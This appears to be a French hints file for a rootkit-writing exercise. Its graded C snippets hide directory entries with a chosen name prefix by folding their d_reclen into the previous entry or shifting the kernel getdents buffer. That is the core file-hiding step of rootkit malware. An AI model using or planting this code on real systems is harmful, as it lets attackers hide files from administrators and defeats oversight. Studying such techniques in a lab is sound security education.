# Hints, exercice 029

## Niveau 1

Utilise `strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX))` pour
verifier si le nom commence par le prefixe.

Pour "absorber" une entree, ajoute son d_reclen a l'entree precedente.
L'entree disparait car le parcours saute directement de prev a next.

## Niveau 2

```c
if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
    if (prev)
        prev->d_reclen += cur->d_reclen;
    else {
        ret -= cur->d_reclen;
        memmove(kbuf, (char *)kbuf + cur->d_reclen, ret);
    }
    hidden++;
} else {
    prev = cur;
}
```

N'oublie pas: avance offset AVANT de modifier quoi que ce soit, ou
sauvegarde d_reclen dans une variable locale.

## Niveau 3

Le piege: il faut sauvegarder `cur->d_reclen` dans une variable locale
AVANT de le modifier via prev. Sinon l'offset avance de la mauvaise valeur.

```c
unsigned short reclen = cur->d_reclen;

if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
    if (prev)
        prev->d_reclen += reclen;
    else {
        ret -= reclen;
        memmove(kbuf, (char *)kbuf + reclen, ret);
        continue;  // ne pas avancer offset, le buffer a ete decale
    }
    hidden++;
} else {
    prev = cur;
}
offset += reclen;
```

Attention au `continue` quand prev est NULL: apres memmove, le debut
du buffer contient la prochaine entree, donc on ne doit pas avancer offset.
Utilise une boucle while avec gestion explicite de offset.
